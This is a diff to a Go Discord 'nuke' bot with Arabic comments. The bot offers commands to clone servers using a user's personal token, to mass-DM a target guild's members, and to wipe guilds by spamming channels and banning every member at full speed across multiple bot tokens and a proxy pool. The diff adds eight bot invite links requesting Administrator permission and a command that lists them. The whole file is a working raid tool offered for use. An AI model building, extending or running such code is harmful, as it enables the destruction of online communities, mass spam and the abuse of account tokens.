@@ -28,6 +28,18 @@ var massiveProxyPool = []string{
 	"200.105.215.12:80",
 }
 
+// روابط الدعوة الـ 8 الخاصة بالبوتات لسهولة الوصول والإضافة
+var botInviteLinks = []string{
+	"https://discord.com/oauth2/authorize?client_id=1569045384469151745&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569045739760255177&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569045957860139178&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569046159060762754&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569046425596067923&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569046625933070467&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569046860348399626&permissions=8&integration_type=0&scope=bot",
+	"https://discord.com/oauth2/authorize?client_id=1569047087620956260&permissions=8&integration_type=0&scope=bot",
+}
+
 var db *sql.DB
 
 func initDatabase() {
@@ -102,7 +114,7 @@ func main() {
 		Options: []*discordgo.ApplicationCommandOption{
 			{Type: discordgo.ApplicationCommandOptionString, Name: "template_guild_id", Description: "إيدي السيرفر المراد نسخه", Required: true},
 			{Type: discordgo.ApplicationCommandOptionString, Name: "user_token", Description: "التوكن الشخصي لحسابك (لسحب السيرفر المصدر)", Required: true},
-			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات لتنفيذ الإنشاء (مفصولة بفاصلة)", Required: true},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات مفصولة بـ (,) أو مسافة", Required: true},
 		},
 	}
 
@@ -116,7 +128,7 @@ func main() {
 			{Type: discordgo.ApplicationCommandOptionInteger, Name: "rooms_count", Description: "عدد الرومات", Required: true},
 			{Type: discordgo.ApplicationCommandOptionString, Name: "message_content", Description: "محتوى رسالة السبام", Required: true},
 			{Type: discordgo.ApplicationCommandOptionInteger, Name: "messages_count", Description: "عدد الرسائل بكل روم", Required: true},
-			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات التنفيذية مفصولة بفاصلة", Required: true},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات التنفيذية مفصولة بـ (,) أو مسافة", Required: true},
 		},
 	}
 
@@ -128,8 +140,14 @@ func main() {
 			{Type: discordgo.ApplicationCommandOptionString, Name: "guild_id", Description: "إيدي السيرفر المراد استهدافه", Required: true},
 			{Type: discordgo.ApplicationCommandOptionString, Name: "user_token", Description: "التوكن الشخصي لحسابك (للسحب)", Required: true},
 			{Type: discordgo.ApplicationCommandOptionString, Name: "message", Description: "محتوى الرسالة المراد إرسالها بالخاص", Required: true},
-			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات أو الحسابات للإرسال (مفصولة بفاصلة)", Required: true},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات للإرسال مفصولة بـ (,) أو مسافة", Required: true},
 		},
+	}
+
+	cmdInvites := "invites"
+	commandInvites := &discordgo.ApplicationCommand{
+		Name:        cmdInvites,
+		Description: "عرض روابط الدعوة الـ 8 الخاصة بالبوتات لإضافتها للسيرفر",
 	}
 
 	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
@@ -173,6 +191,20 @@ func main() {
 			userToken := optMap["user_token"].(string)
 			message := optMap["message"].(string)
 			go executeCrossReferenceMassDM(tokens, userToken, massiveProxyPool, guildID, message, i.ChannelID, i.Interaction, s)
+
+		} else if data.Name == cmdInvites {
+			var sb strings.Builder
+			sb.WriteString("🔗 **روابط دعوة البوتات الـ 8 (مع صلاحية Administrator):**\n\n")
+			for idx, link := range botInviteLinks {
+				sb.WriteString(fmt.Sprintf("**البوت %d:**\n%s\n\n", idx+1, link))
+			}
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: sb.String(),
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
 		}
 	})
 
@@ -185,7 +217,8 @@ func main() {
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandClone)
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandMassDM)
-	fmt.Println("⚡ الأوامر الثلاثة (cloner, nuke1, massdm) جاهزة بالكامل بوضع السرعة القصوى!")
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandInvites)
+	fmt.Println("⚡ الأوامر (cloner, nuke1, massdm, invites) جاهزة بالكامل!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -215,8 +248,10 @@ func parseTokens(input interface{}) []string {
 	if !ok {
 		return nil
 	}
+	// يدعم الفواصل والمسافات لفصل التوكنات بكل مرونة
+	str = strings.ReplaceAll(str, ",", " ")
 	var res []string
-	for _, t := range strings.Split(str, ",") {
+	for _, t := range strings.Fields(str) {
 		t = strings.TrimSpace(t)
 		if t != "" {
 			res = append(res, t)
@@ -801,7 +836,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
-	// سحب الأعضاء بالكامل للباند السريع
 	var allUserIDs []string
 	if includeBan {
 		after := ""
@@ -864,7 +898,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 	wgDel.Wait()
 
-	// 2. إبادة الباندات (Overdrive Mode: بلا أي فواصل زمنية، ضربات متزامنة مطلقة لطحن عشرات الآلاف)
+	// 2. إبادة الباندات (Overdrive Mode: بلا أي فواصل زمنية، ضربات متزامنة مطلقة)
 	if includeBan && len(allUserIDs) > 0 && len(tokens) > 0 {
 		var wgBan sync.WaitGroup
 		totalUsers := len(allUserIDs)
@@ -887,7 +921,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 
 				botQueue := allUserIDs[start:end]
 
-				// إطلاق الطلبات بأقصى سرعة ممكنة بدون أي time.Sleep نهائياً
 				for _, uid := range botQueue {
 					urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
 					req, err := http.NewRequestWithContext(context.Background(), "PUT", urlStr, nil)
